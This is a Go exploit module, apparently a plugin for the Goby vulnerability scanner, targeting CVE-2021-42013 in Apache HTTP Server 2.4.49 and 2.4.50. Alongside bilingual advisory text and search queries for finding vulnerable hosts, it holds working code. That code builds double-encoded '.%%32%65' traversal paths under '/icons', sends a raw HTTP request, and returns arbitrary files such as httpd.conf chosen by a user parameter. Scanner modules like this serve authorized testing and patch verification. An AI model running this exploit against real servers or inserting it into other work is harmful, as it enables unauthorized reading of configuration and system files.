package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache HTTP Server Directory Traversal Vulnerability (CVE-2021-42013)",
    "Description": "<p>Apache HTTP Server (Apache for short) is an open source web server of the Apache Software Foundation. It can run on most computer operating systems. Due to its cross-platform and security, it is widely used and is one of the most popular web server-side software. one. It is fast, reliable and extensible through a simple API to compile interpreters such as Perl/Python into the server.</p><p>A flaw was discovered in changes to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker can use a directory traversal attack to map a URL to a file outside the intended document root. These requests may succeed if files outside the document root are not protected by Ask All Deny. Additionally, this flaw could reveal the origin of interpreted files such as CGI scripts.</p>",
    "Impact": "<p>Attackers can use directory traversal attacks to map URLs to files outside of the expected document root directory. If files outside the document root directory are not protected by the 'request to reject all' policy, these requests may succeed. In addition, this flaw may reveal the source of CGI scripts and other explanatory files.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:  <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a><a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\"></a></p>",
    "Product": "APACHE-HTTP_Server",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache  HTTP Server 目录穿越漏洞（CVE-2021-42013）",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>Apache HTTP Server（简称 Apache）是 Apache 软件基金会的一个开放源码的网页服务器，可以在大多数计算机操作系统中运行，由于其跨平台和安全性被广泛使用，是最流行的 Web 服务器端软件之一。它快速、可靠并且可通过简单的API扩展，将 Perl/Python 等解释器编译到服务器中。</p><p>在 Apache HTTP Server 2.4.49 和 2.4.50 中对路径规范化所做的更改中发现了一个缺陷。 攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
            "Impact": "<p>攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源。</p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Apache HTTP Server Directory Traversal Vulnerability (CVE-2021-42013)",
            "Product": "APACHE-HTTP_Server",
            "Description": "<p>Apache HTTP Server (Apache for short) is an open source web server of the Apache Software Foundation. It can run on most computer operating systems. Due to its cross-platform and security, it is widely used and is one of the most popular web server-side software. one. It is fast, reliable and extensible through a simple API to compile interpreters such as Perl/Python into the server.</p><p>A flaw was discovered in changes to path normalization in Apache HTTP Server 2.4.49 and 2.4.50. An attacker can use a directory traversal attack to map a URL to a file outside the intended document root. These requests may succeed if files outside the document root are not protected by Ask All Deny. Additionally, this flaw could reveal the origin of interpreted files such as CGI scripts.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;&nbsp;<a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a><a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\"></a></p>",
            "Impact": "<p>Attackers can use directory traversal attacks to map URLs to files outside of the expected document root directory. If files outside the document root directory are not protected by the 'request to reject all' policy, these requests may succeed. In addition, this flaw may reveal the source of CGI scripts and other explanatory files.<br></p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "banner=\"apache/2.4.49\" || banner=\"apache/2.4.50\" || header=\"apache/2.4.49\" || header=\"apache/2.4.50\"",
    "GobyQuery": "banner=\"apache/2.4.49\" || banner=\"apache/2.4.50\" || header=\"apache/2.4.49\" || header=\"apache/2.4.50\"",
    "Author": "keeeee",
    "Homepage": "https://www.apache.org/",
    "DisclosureDate": "2021-10-08",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-42013"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-42013"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202110-413"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "../conf/httpd.conf",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [
            "Apache"
        ],
        "Hardware": []
    },
    "PostTime": "2023-11-22",
    "CVSSScore": "9.8",
    "PocId": "10881"
}`

	sendPayloadFlagaaSD8q := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		conn, err := httpclient.GetTCPConn(hostInfo.HostInfo)
		if err != nil {
			return "", err
		}
		defer conn.Close()
		filePath = strings.ReplaceAll(filePath, `..`, `.%%32%65`)
		if !strings.HasPrefix(filePath, `/`) {
			filePath = `/` + filePath
		}
		filePath = `/icons` + filePath
		messageData := []byte("GET " + filePath + " HTTP/1.1\r\n" +
			"Host: " + hostInfo.HostInfo + "\r\n" +
			"Upgrade-Insecure-Requests: 1\r\n" +
			"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36\r\n" +
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n" +
			"Accept-Encoding: gzip, deflate\r\n" +
			"Accept-Language: zh-CN,zh;q=0.9\r\n" +
			"Connection: close\r\n" +
			"\r\n" +
			"\r\n")
		_, err = conn.Write(messageData)
		buf := make([]byte, 1024)
		responseString := ""
		for {
			count, errs := conn.Read(buf)
			tmpMessageData := string(buf[0:count])
			responseString += tmpMessageData
			if errs != nil {
				break
			}
		}
		return responseString, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			path := "../conf/httpd.conf"
			resp, _ := sendPayloadFlagaaSD8q(hostinfo, path)
			return regexp.MustCompile("This is the main Apache HTTP server configuration file").MatchString(resp) || regexp.MustCompile("ServerRoot \"(.*)\"").MatchString(resp)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			if resp, err := sendPayloadFlagaaSD8q(expResult.HostInfo, filePath); err != nil {
				expResult.Output = err.Error()
			} else if strings.Contains(resp, `200 OK`) {
				expResult.Output = resp
				expResult.Success = true
			} else {
				expResult.Output = `漏洞利用失败`
			}
			return expResult
		},
	))
}